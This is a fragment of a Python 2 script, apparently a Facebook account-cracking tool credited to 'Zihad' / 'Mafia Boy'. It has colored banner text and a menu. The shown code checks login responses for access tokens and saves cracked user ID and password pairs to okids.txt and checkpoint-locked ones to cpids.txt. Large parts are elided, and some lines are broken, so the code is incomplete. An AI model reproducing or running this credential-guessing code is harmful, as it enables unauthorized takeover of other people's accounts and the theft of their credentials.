...
\n\033[0m--------------------------------------------------------------------
\033[1;92mAuthor \033[1;93m: Zihad
\033[1;92mFb \033[1;93m: Mafia Boy 
...
def main():
    ...
    print ' \033[0m[2].\x1b[1;96m Follow In Yt'
...
def log_sel():
    select = raw_input('https://www.facebook.com/MAFIA.Boy71')
    if select == '1':
        menu()
    elif select == '2':
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                q = json.loads(data)
                if 'access_token' in q:
                    print '\x1b[1;32m[Zihad-OK]\033[0m ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('okids.txt', 'a')
                    ok.write(uid + '|' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;31m[Zihad-CP] \033[0m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    cp = open('cpids.txt', 'a')
                    cp.write(uid + '|' + pass2 + '\n')
                    cp.close()
